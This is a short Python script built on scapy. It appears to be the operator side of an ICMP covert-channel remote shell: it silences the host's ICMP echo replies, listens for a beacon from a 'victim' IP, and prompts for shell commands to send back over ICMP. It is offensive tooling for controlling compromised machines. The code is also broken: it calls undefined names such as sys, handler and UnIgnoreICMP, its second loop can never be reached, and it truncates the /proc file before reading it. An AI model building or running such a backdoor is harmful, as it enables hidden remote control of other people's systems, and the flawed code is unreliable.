from scapy.all import sr,IP,ICMP,Raw,sniff
from multiprocessing import Process
import argparse
import os

ICMP_ID = int(13331)
TTL = int(64)
ICMP_ID_HELO = int(23144)
my_iface = "eno1"
victim_ip = ""
active = 0
 
def ignoreICMP():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "1":
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit() 
 

def IsActive(pkt):
    if pkt[ICMP].id == ICMP_ID_HELO:
        victim_ip += pkt[IP].src
        print("I'm active master! your wish is my command.")
        active = 1

def main():
    ignoreICMP()

    while True:
        sniff(iface=my_iface, prn=IsActive, filter="icmp")

    while True:
        icmp_shell = input("shell: ")    
        sniff(iface=my_iface, prn=handler, filter="icmp")
        
        
        if icmp_shell == 'exit':
            UnIgnoreICMP()
            break
      